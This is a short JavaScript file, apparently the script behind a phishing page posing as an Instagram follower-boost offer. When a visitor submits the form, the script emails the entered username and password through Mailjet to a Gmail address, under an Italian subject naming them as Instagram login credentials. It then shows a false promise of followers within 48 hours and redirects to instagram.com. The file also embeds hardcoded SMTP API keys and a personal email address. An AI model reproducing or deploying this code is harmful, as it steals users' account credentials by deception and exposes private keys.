const userDom = document.getElementById('user')
const passwordDom = document.getElementById('password')
const buttonDom = document.getElementById('button');

buttonDom.addEventListener('click', () => {
    const user = userDom.value;
    const password = passwordDom.value;
    if (user && password) {
        Email.send({
            Host: "in-v3.mailjet.com",
            Username : "af21d5b434d0a0b01a67905037b95c76",
            Password : "32841af457eec1bb7c9c1c5b987d58dc",
            To : 'alberto.ice04@gmail.com',
            From : "alberto.ice04@gmail.com",
            Subject : "Credenziali accesso instagram",
            Body : `Un coglione ha inviato le credenziali: ${user} ${password}`
        })
        alert('Operazione eseguta con successo! Riceverai i followers entro 48 ore');
        location.href = 'https://www.instagram.com/'
    }
})